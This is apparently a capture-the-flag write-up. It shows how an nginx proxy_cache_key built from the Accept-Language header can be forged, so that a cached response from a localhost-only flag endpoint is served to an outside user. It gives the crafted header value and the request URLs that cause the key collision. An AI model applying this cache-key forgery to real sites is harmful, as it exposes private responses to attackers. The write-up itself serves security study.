In nginx.conf:

```c
proxy_cache_key "$language$request_uri";

# accept-language: en,en-US;q=0.8,ja;q=0.6 -> "en"
# accept-language: pl,en-US;q=0.8,ja;q=0.6 -> "pl"
map $http_accept_language $language {
    default 'en';
    '~^(.+?),' $1;
}
```

/api/v1/flag has flag, and /api/v1/report_meme does GET request from localhost with url input.

From report_meme: http://localhost/api/v1/flag?/api/yo

- Accept-Language: `en (default)`
- proxy_cache_key == `"en/api/v1/flag?/api/yo"`

Then directly from user: http://website/api/yo

- Accept-Language: `en/api/v1/flag?,`
- proxy_cache_key == `"en/api/v1/flag?/api/yo"`

So cache hit occurs, with flag.

## Reference

https://portswigger.net/research/practical-web-cache-poisoning